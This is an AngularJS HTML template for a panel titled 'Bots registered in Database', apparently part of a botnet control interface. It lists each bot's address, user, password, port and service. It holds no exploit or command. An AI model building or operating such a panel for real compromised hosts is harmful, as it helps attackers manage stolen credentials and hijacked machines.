<div class="panel panel-primary" ng-controller="botnetController">
    <div class="panel-heading">Bots registered in Database.</div>
        <table class="table table-bordered table-hover table-bordered">
            <thead>
                <tr>
                    <th>Address</th>
                    <th>User</th>
                    <th>Password</th>
                    <th>Port</th>
                    <th>Nickname</th>
                    <th>Service</th>
                </tr>
            </thead>
            <tbody>
                <tr ng-repeat="bot in botsList">
                    <td>{{bot.address}}</td>
                    <td>{{bot.userservice}}</td>
                    <td>{{bot.password}}</td>
                    <td>{{bot.port}}</td>
                    <td>{{bot.nickname}}</td>
                    <td>{{bot.servicetype}}</td>
                </tr>
            </tbody>
        </table>
</div>
